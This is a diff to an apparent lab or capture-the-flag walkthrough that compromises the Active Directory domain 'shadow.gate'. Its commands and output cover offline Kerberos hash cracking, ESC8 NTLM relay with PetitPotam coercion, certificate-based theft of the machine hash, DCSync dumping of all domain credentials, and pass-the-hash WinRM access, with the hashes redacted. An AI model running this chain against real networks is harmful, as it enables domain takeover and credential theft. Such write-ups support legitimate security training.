@@ -148,7 +148,7 @@ LDAP  DC01  $krb5asrep$23$jtrueblood@SHADOW.GATE:caead45788330e72cd587bbe549cdd1
 `jtrueblood` is AS-REP roastable. Crack offline:
 
 ```bash
-hashcat hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
@@ -217,7 +217,7 @@ $krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$7ce933b9424f27a6cc71efc04721
 ```
 
 ```bash
-hashcat hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
@@ -253,7 +253,7 @@ Certificate Authorities: 1
     ESC8: Web Enrollment is enabled over HTTP
 ```
 
-**ESC8 confirmed.** Web enrollment is enabled over plain HTTP with NTLM authentication. Because SMB signing is not enforced in this environment, we can:
+**ESC8 confirmed.** Web enrollment is enabled over plain HTTP with NTLM authentication — credentials sent to `/certsrv/` are relayable because there is no channel binding or HTTPS requirement. We can:
 
 1. Coerce DC01$ into authenticating to our listener via MS-EFSRPC (PetitPotam)
 2. Relay that NTLM auth to `/certsrv/certfnsh.asp`
@@ -275,7 +275,7 @@ sudo impacket-ntlmrelayx \
 
 ### Step 2 — Coerce DC01$ Authentication (Authenticated MS-EFSRPC)
 
-> Unauthenticated EfsRpcOpenFileRaw (MS08-025 patch) is blocked on this target — the authenticated path via `bbrown` is required.
+> The unauthenticated variant of PetitPotam (`EfsRpcOpenFileRaw`) is patched on this target — the authenticated path via `bbrown` is required.
 
 ```bash
 python3 ~/Tools/PetitPotam/PetitPotam.py \
@@ -332,7 +332,7 @@ certipy auth -pfx DC01.shadow.gate.pfx -dc-ip <DC_IP>
 [*] Got TGT
 [*] Saving credential cache to 'dc01.ccache'
 [*] Trying to retrieve NT hash for 'dc01$'
-[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:<DC01_HASH>
+[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
 ```
 
 **DC01$ machine account hash obtained.**
@@ -344,25 +344,25 @@ certipy auth -pfx DC01.shadow.gate.pfx -dc-ip <DC_IP>
 With the DC machine account hash, perform a DCSync to extract all domain credentials. Domain Controllers have replication rights by design — DC01$ can pull any object including `krbtgt`.
 
 ```bash
-secretsdump.py -just-dc-ntlm \
+impacket-secretsdump -just-dc-ntlm \
   shadow.gate/'DC01$'@<DC_IP> \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:<DC01_HASH>'
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:<REDACTED>'
 ```
 
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_HASH>:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
-shadow.gate\ATHENA:1103:...
-shadow.gate\mbrownlee:1104:...
-shadow.gate\bbrown:1109:...
-shadow.gate\jtrueblood:1110:...
-shadow.gate\jsmith:1112:...
-shadow.gate\clocke:1113:...
-shadow.gate\tclarke:1114:...
-shadow.gate\jbradford:1115:...
-shadow.gate\amoss:1116:...
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<DC01_HASH>:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
 ```
 
 All domain credentials dumped. Domain fully compromised.
@@ -373,16 +373,16 @@ All domain credentials dumped. Domain fully compromised.
 
 ```bash
 nxc winrm dc01.shadow.gate \
-  -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<ADMIN_HASH>
+  -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<REDACTED>
 ```
 
 ```
-WINRM  DC01  [+] shadow.gate\Administrator:<ADMIN_HASH> (Pwn3d!)
+WINRM  DC01  [+] shadow.gate\Administrator:<REDACTED> (Pwn3d!)
 ```
 
 ```bash
 evil-winrm -i <DC_IP> -u Administrator \
-  -H aad3b435b51404eeaad3b435b51404ee:<ADMIN_HASH>
+  -H aad3b435b51404eeaad3b435b51404ee:<REDACTED>
 ```
 
 ```
